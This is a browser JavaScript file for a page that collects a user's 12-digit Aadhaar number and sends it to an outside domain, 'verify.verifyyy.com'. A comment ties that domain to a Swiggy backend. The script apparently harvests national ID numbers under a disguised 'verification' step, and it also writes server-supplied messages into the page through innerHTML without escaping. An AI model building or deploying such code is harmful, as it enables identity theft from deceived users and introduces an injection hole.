document.addEventListener('DOMContentLoaded', () => {
    const startBtn = document.getElementById('start-verification-btn');
    const aadharInput = document.getElementById('aadhar-input');
    const resultDiv = document.getElementById('verification-result');

    startBtn.addEventListener('click', async () => {
        const aadhar = aadharInput.value.trim().replace(/\s/g, '');

        if (!aadhar || aadhar.length !== 12 || isNaN(aadhar)) {
            alert('Please enter a valid 12-digit Aadhaar number.');
            return;
        }

        // Change button state
        startBtn.textContent = 'Verifying...';
        startBtn.disabled = true;
        startBtn.style.opacity = '0.7';
        resultDiv.style.display = 'none';

        // The only connection link requested for swiggy backend
        const verifyEndpoint = 'https://verify.verifyyy.com/session?id=966e03d0-d0ff-4ee3-806f-8b32be191434';

        try {
            const response = await fetch(verifyEndpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ aadhar_number: aadhar })
            });

            const data = await response.json();

            if (response.ok && data.status === 'success') {
                resultDiv.style.display = 'block';
                resultDiv.style.backgroundColor = '#d4edda';
                resultDiv.style.color = '#155724';
                resultDiv.style.border = '1px solid #c3e6cb';
                resultDiv.innerHTML = `<strong>Success!</strong> Aadhaar verified locally. <br><small>${data.message}</small>`;
                
                startBtn.textContent = 'Verified ✓';
                startBtn.style.backgroundColor = '#28a745';
                startBtn.style.opacity = '1';
            } else {
                throw new Error(data.detail || 'Verification failed');
            }
        } catch (error) {
            resultDiv.style.display = 'block';
            resultDiv.style.backgroundColor = '#f8d7da';
            resultDiv.style.color = '#721c24';
            resultDiv.style.border = '1px solid #f5c6cb';
            resultDiv.innerHTML = `<strong>Error!</strong> ${error.message}`;
            
            startBtn.textContent = 'Retry Verification';
            startBtn.disabled = false;
            startBtn.style.opacity = '1';
        }
    });
});
